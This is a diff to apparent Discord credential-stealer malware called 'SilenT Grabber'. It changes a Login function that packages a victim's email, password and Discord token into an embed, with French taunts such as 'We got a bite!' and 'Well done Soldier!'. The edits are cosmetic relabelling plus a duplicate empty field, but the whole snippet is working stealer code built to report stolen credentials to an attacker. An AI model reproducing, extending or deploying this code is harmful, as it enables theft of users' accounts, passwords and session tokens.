@@ -153,11 +153,12 @@ function Login(email, password, token) {
                     "fields": [
                         {
                             "name": "**On à une touche !**",
-                            "value": `Son Email : ${email}  Mot de passe: ${password}`,
+			    "value": ``,
+                            "value": `Email : ${email}  Mot de passe: ${password}`,
                             "inline": true
                         },
                         {
-                            "name": "**Son Token**",
+                            "name": "**Token**",
                             "value": `\`${token}\``,
                             "inline": true
                         }
@@ -167,7 +168,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "SilenT Grabber. Il peut plus s'échappé !"
+                        "text": "SilenT Grabber. Il peut plus s'échappé ! Bien joué Soldat !"
                     }
                 }
             ]
